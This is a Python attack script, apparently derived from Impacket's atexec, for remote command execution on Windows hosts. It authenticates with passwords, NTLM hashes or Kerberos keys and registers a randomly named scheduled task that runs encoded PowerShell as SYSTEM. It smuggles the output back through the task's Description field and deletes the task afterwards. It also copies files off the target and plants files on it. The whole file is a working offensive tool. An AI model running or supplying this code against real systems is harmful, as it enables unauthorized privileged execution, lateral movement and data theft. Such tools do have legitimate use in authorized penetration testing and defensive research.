from __future__ import division
from __future__ import print_function
import string
import sys
import argparse
import time
import random
import base64
import os
import logging
import re
import gzip

from impacket.examples import logger
from impacket import version
from impacket.dcerpc.v5 import tsch, transport
from impacket.dcerpc.v5.dtypes import NULL
from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_GSS_NEGOTIATE, \
    RPC_C_AUTHN_LEVEL_PKT_PRIVACY
from impacket.krb5.keytab import Keytab
from six import PY2
from impacket.dcerpc.v5.epm import hept_map
from impacket.uuid import uuidtup_to_bin


CODEC = sys.stdout.encoding

class SC_EXEC:
    def __init__(self, username='', password='', domain='', hashes=None, aesKey=None, doKerberos=False, kdcHost=None,
                 command=None):
        self.__username = username
        self.__password = password
        self.__domain = domain
        self.__lmhash = ''
        self.__nthash = ''
        self.__aesKey = aesKey
        self.__doKerberos = doKerberos
        self.__kdcHost = kdcHost
        self.__command = command
        if hashes is not None:
            self.__lmhash, self.__nthash = hashes.split(':')
    def play(self, addr):
        stringbinding = hept_map(addr,uuidtup_to_bin(('86D35949-83C9-4044-B424-DB363231FD0C','1.0')),protocol='ncacn_ip_tcp')
        rpctransport = transport.DCERPCTransportFactory(stringbinding)
        if hasattr(rpctransport, 'set_credentials'):
            rpctransport.set_credentials(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash,
                                         self.__aesKey)
            rpctransport.set_kerberos(self.__doKerberos, self.__kdcHost)
        try:
            self.doStuff(rpctransport)
        except Exception as e:
            if logging.getLogger().level == logging.DEBUG:
                import traceback
                traceback.print_exc()
            logging.error(e)
            if str(e).find('STATUS_OBJECT_NAME_NOT_FOUND') >=0:
                logging.info('When STATUS_OBJECT_NAME_NOT_FOUND is received, try running again. It might work')

    def doStuff(self, rpctransport):
        dowanload = False
        upload = False
        loaclFilePath = ""
        fileNamePath = ""
        fileName = ""
        def output_callback(data):
            try:
                print(data.decode(CODEC))
            except UnicodeDecodeError:
                logging.error('Decoding error detected, consider running chcp.com at the target,\nmap the result with '
                              'https://docs.python.org/3/library/codecs.html#standard-encodings\nand then execute atexec.py '
                              'again with -codec and the corresponding codec')
                print(data.decode(CODEC, errors='replace'))

        def xml_escape(data):
            replace_table = {
                 "&": "&amp;",
                 '"': "&quot;",
                 "'": "&apos;",
                 ">": "&gt;",
                 "<": "&lt;",
                 }
            return ''.join(replace_table.get(c, c) for c in data)
        dce = rpctransport.get_dce_rpc()
        dce.set_credentials(*rpctransport.get_credentials())
        if self.__doKerberos is True:
            dce.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)
        dce.connect()
        dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
        dce.bind(tsch.MSRPC_UUID_TSCHS)
        if len(self.__command)>=3 and self.__command[:3] == "get":
            dowanload = True
            fileNamePath = self.__command.split(" ")[1]
            fileName = os.path.basename(fileNamePath)
            self.__command = "$o = [System.IO.File]::ReadAllBytes('%s');$c = New-Object System.IO.MemoryStream;$g = New-Object System.IO.Compression.GzipStream($c, [System.IO.Compression.CompressionMode]::Compress);$g.Write($o, 0, $o.Length);$g.Dispose();$b = $c.ToArray();$c.Dispose() ;[Convert]::ToBase64String($b)" % fileNamePath
        if len(self.__command)>=3 and self.__command[:3] == "put":
            upload = True
            fb = ""
            loaclFilePath = self.__command.split(" ")[1]
            fileNamePath = self.__command.split(" ")[2]
            with open(loaclFilePath, 'rb') as f:
                fb = f.read()
            b64_bytes = (base64.b64encode(fb)).decode("ascii")
            self.__command = "$b =[System.Convert]::FromBase64String('%s');[System.IO.File]::WriteAllBytes('%s',$b);"%(b64_bytes,fileNamePath)
        tmpName = ''.join([random.choice(string.ascii_letters) for _ in range(10)])
        ps_arguments =  f"$task=Get-ScheduledTask -TaskName \"{tmpName}\" -TaskPath \\;$task.Description=[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes((iex ([System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($task.Description)))| Out-String)));Set-ScheduledTask $task;[Environment]::Exit(0)"
        b64encoded_ps_script = base64.b64encode(ps_arguments.encode('utf-16le')).decode('ascii')
        b64encoded_command = base64.b64encode(self.__command.encode('utf-16le')).decode('ascii')
        xml = """<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.3" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Description>%s</Description>
  </RegistrationInfo>
  <Triggers />
  <Principals>
    <Principal id="Author">
      <UserId>SYSTEM</UserId>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>true</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>false</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <Duration>PT10M</Duration>
      <WaitTimeout>PT1H</WaitTimeout>
      <StopOnIdleEnd>true</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>false</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <UseUnifiedSchedulingEngine>false</UseUnifiedSchedulingEngine>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT72H</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>powershell.exe</Command>
      <Arguments>-NonInteractive -Enc "%s"</Arguments>
    </Exec>
  </Actions>
</Task>""" % (xml_escape(b64encoded_command), xml_escape(b64encoded_ps_script))
        try:
            logging.info('Creating task \\%s' % tmpName)
            tsch.hSchRpcRegisterTask(dce, '\\%s' % tmpName, xml, tsch.TASK_CREATE, NULL, tsch.TASK_LOGON_NONE)
            logging.info('Running task \\%s' % tmpName)
            done = False
            tsch.hSchRpcRun(dce, '\\%s' % tmpName)
            while not done:
                logging.debug('Calling SchRpcGetLastRunInfo for \\%s' % tmpName)
                resultRetrieveTask = tsch.hSchRpcRetrieveTask(dce,'\\%s'%tmpName)
                resp = tsch.hSchRpcGetLastRunInfo(dce, '\\%s' % tmpName)
                if resp['pLastRuntime']['wYear'] != 0 and resp['pLastReturnCode'] == 0:
                    done = True
                else:
                    time.sleep(2)
            logging.info('Deleting task \\%s' % tmpName)
            tsch.hSchRpcDelete(dce, '\\%s' % tmpName)
            taskCreated = False
            resultXML = resultRetrieveTask['pXml']
            if "Description" not in resultXML:
                logging.info("None")
                return False
            start = resultXML.find("<Description>") + len("<Description>")
            end = resultXML.find("</Description>")
            result = resultXML[start:end]
            try:
                if dowanload == True:
                    b64_bytes = gzip.decompress(base64.b64decode(base64.b64decode(result).decode('utf-16le')))
                    with open(fileName, 'wb') as f:
                        f.write(b64_bytes)
                        logging.info('Download  %s' % fileName)
                        return
            except Exception as e:
                logging.error(e)
            logging.info(base64.b64decode(result).decode('utf-16le'))
        except Exception as e:
            logging.error(e)
            e.get_packet().dump()
        finally:
            if taskCreated is True:
                tsch.hSchRpcDelete(dce, '\\%s' % tmpName)


if __name__ == '__main__':
    parser = argparse.ArgumentParser()

    parser.add_argument('target', action='store', help='[[domain/]username[:password]@]<targetName or address>')
    parser.add_argument('-c', action='store', default=' ', help='command to execute at the target [put 7z1900-x64.exe c:\\2.exe] [get c:\\2.exe]')
    parser.add_argument('-ts', action='store_true', help='adds timestamp to every logging output')
    parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
    parser.add_argument('-codec', action='store', help='Sets encoding used (codec) from the target\'s output (default '
                                                       '"%s"). If errors are detected, run chcp.com at the target, '
                                                       'map the result with '
                          'https://docs.python.org/3/library/codecs.html#standard-encodings and then execute wmiexec.py '
                          'again with -codec and the corresponding codec ' % CODEC)
    group = parser.add_argument_group('authentication')
    group.add_argument('-hashes', action="store", metavar = "LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
    group.add_argument('-no-pass', action="store_true", help='don\'t ask for password (useful for -k)')
    group.add_argument('-k', action="store_true", help='Use Kerberos authentication. Grabs credentials from ccache file '
                       '(KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the '
                       'ones specified in the command line')
    group.add_argument('-aesKey', action="store", metavar = "hex key", help='AES key to use for Kerberos Authentication '
                                                                            '(128 or 256 bits)')
    group.add_argument('-dc-ip', action='store',metavar = "ip address",  help='IP Address of the domain controller. '
                                         'If omitted it will use the domain part (FQDN) specified in the target parameter')
    group.add_argument('-keytab', action="store", help='Read keys for SPN from keytab file')
    if len(sys.argv)==1:
        parser.print_help()
        sys.exit(1)
    options = parser.parse_args()
    logger.init(options.ts)
    if options.codec is not None:
        CODEC = options.codec
    else:
        if CODEC is None:
            CODEC = 'utf-8'
    logging.warning("This will work ONLY on Windows >= Vista")
    if ''.join(options.c) == ' ':
        logging.error('You need to specify a command to execute!')
        sys.exit(1)
    if options.debug is True:
        logging.getLogger().setLevel(logging.DEBUG)
        # Print the Library's installation path
        logging.debug(version.getInstallationPath())
    else:
        logging.getLogger().setLevel(logging.INFO)
    import re
    domain, username, password, address = re.compile('(?:(?:([^/@:]*)/)?([^@:]*)(?::([^@]*))?@)?(.*)').match(
        options.target).groups('')
    #In case the password contains '@'
    if '@' in address:
        password = password + '@' + address.rpartition('@')[0]
        address = address.rpartition('@')[2]
    if domain is None:
        domain = ''
    if options.keytab is not None:
        Keytab.loadKeysFromKeytab (options.keytab, username, domain, options)
        options.k = True
    if password == '' and username != '' and options.hashes is None and options.no_pass is False and options.aesKey is None:
        from getpass import getpass
        password = getpass("Password:")
    if options.aesKey is not None:
        options.k = True
    atsvc_exec = SC_EXEC(
        username, 
        password,
        domain, 
        options.hashes, 
        options.aesKey, 
        options.k, 
        options.dc_ip,
        options.c)
    atsvc_exec.play(address)





      











     

